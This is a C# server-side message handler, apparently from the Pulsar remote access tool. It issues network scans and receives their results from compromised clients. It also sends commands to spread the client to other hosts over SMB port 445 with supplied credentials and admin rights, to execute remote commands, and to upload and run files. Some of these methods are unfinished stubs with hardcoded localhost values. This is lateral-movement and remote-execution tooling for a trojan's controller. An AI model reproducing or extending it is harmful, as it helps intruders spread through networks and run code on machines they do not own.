using Pulsar.Common.Enums;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.other;
using Pulsar.Common.Networking;
using Pulsar.Server.Networking;
using Pulsar.Server.Models;
using System.Windows.Forms;
using Pulsar.Server.Forms;
using Pulsar.Common.Messages.Network;
using System.Collections;
using System.Diagnostics;
using System.Net;
using System;
using Pulsar.Common.Models.Network;

namespace Pulsar.Server.Messages
{
    public class NetworkScanResponseEventArgs : EventArgs
    {
        public DoNetworkScanResponse Packet { get; set; }
        public NetworkScanResponseEventArgs(DoNetworkScanResponse packet)
        {
            this.Packet = packet;
        }
    }

    public class InterfaceScanResponseEventArgs : EventArgs
    {
        public DoInterfaceScanResponse Packet { get; set; }
        public InterfaceScanResponseEventArgs(DoInterfaceScanResponse packet)
        {
            this.Packet = packet;
        }
    }

    public class NetworkScanProgressEventArgs : EventArgs
    {
        public DoNetworkScanProgress Packet { get; set; }
        public NetworkScanProgressEventArgs(DoNetworkScanProgress packet)
        {
            this.Packet = packet;
        }
    }

    public class NetworkHandler : MessageProcessorBase<NetworkEntity[]>
    {
        public event EventHandler<NetworkScanResponseEventArgs> NetworkScanResponseEvent;

        public event EventHandler<InterfaceScanResponseEventArgs> InterfaceScanResponseEvent;

        public event EventHandler<NetworkScanProgressEventArgs> NetworkScanProgressEvent;

        private readonly Client _client;

        public NetworkHandler(Client client) : base(true)
        {
            _client = client;
        }

        public override bool CanExecute(IMessage message) => message is DoNetworkScanResponse ||
                                                             message is DoInterfaceScanResponse ||
                                                             message is DoClientMovementResponse ||
                                                             message is DoRemoteCommandExecuteResponse ||
                                                             message is DoUploadAndExecuteResponse ||
                                                             message is DoNetworkScanProgress;

        public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);

        protected virtual void OnNetworkScanResponse(NetworkScanResponseEventArgs e)
        {
            NetworkScanResponseEvent?.Invoke(this, e);
        }

        protected virtual void OnInterfaceScanResponse(InterfaceScanResponseEventArgs e)
        {
            InterfaceScanResponseEvent?.Invoke(this, e);
        }

        protected virtual void OnNetworkScanProgress(NetworkScanProgressEventArgs e)
        {
            NetworkScanProgressEvent?.Invoke(this, e);
        }

        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoNetworkScanResponse scanResp:
                    Execute(sender, scanResp);
                    break;
                case DoInterfaceScanResponse intrResp:
                    Execute(sender, intrResp);
                    break;
                case DoClientMovementResponse moveResp:
                    Execute(sender, moveResp);
                    break;
                case DoRemoteCommandExecuteResponse cmdResp:
                    Execute(sender, cmdResp);
                    break;
                case DoUploadAndExecuteResponse uploadResp:
                    Execute(sender, uploadResp);
                    break;
                case DoNetworkScanProgress progResp:
                    Execute(sender, progResp);
                    break;
            }
        }

        public void RefreshInterfaces()
        {
            _client.Send(new DoInterfaceScan());
        }

        public void RefreshEntities(InterfaceEntity entity)
        {
            _client.Send(new DoNetworkScan { nic = entity });
        }

        public void MoveToEntity(NetworkEntity entity, string username, string password, ShareEntity share = null, bool asAdmin = true, bool deleteAfter = true)
        {
            MessageBox.Show("Sending Client Movement...");
            try
            {
                DoClientMovement movementPacket = new DoClientMovement
                {
                    Address = IPAddress.Parse(entity.Address.Address),
                    AsAdmin = asAdmin,
                    DeleteAfter = deleteAfter,
                    MAC = entity.NIC.MAC,
                    Username = username,
                    Password = password,
                    Port = 445,
                    Share = share != null ? share.ShareName : ""
                };
                MessageBox.Show("Sending...");
                _client.Send(movementPacket);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
            finally
            {
                MessageBox.Show("Sent Client Movement!");
            }
        }

        public void UploadAndExecte(NetworkEntity entity, string remotePath)
        {
            _client.Send(new DoUploadAndExecute
            {
                Address = IPAddress.Parse("127.0.0.1"),
                AsAdmin = true,
                DeleteAfter = true,
                MAC = "",
                Username = "",
                Password = "",
                Port = 445,
                Share = ""
            });
        }

        public void RemoteExecute(NetworkEntity entity, ProcessStartInfo info)
        {
            _client.Send(new DoRemoteCommandExecute
            {
                Address = IPAddress.Parse("127.0.0.1"),
                AsAdmin = true,
                MAC = "",
                Command = "",
                Args = new string[] { },
                Username = "",
                Password = "",
                Port = 445,
                Share = ""
            });
        }

        private void Execute(ISender client, DoNetworkScanResponse message)
        {
            OnNetworkScanResponse(new NetworkScanResponseEventArgs(message));
        }

        private void Execute(ISender client, DoInterfaceScanResponse message)
        {
            OnInterfaceScanResponse(new InterfaceScanResponseEventArgs(message));
        }

        private void Execute(ISender client, DoClientMovementResponse message)
        {
            MessageBox.Show("Received Client Movement Response!");
        }

        private void Execute(ISender client, DoRemoteCommandExecuteResponse message)
        {
            MessageBox.Show("Received Remote Command Response!");
        }

        private void Execute(ISender client, DoUploadAndExecuteResponse message)
        {
            MessageBox.Show("Received Upload and Execute Response!");
        }

        private void Execute(ISender client, DoNetworkScanProgress message)
        {
            OnNetworkScanProgress(new NetworkScanProgressEventArgs(message));
        }
    }
}
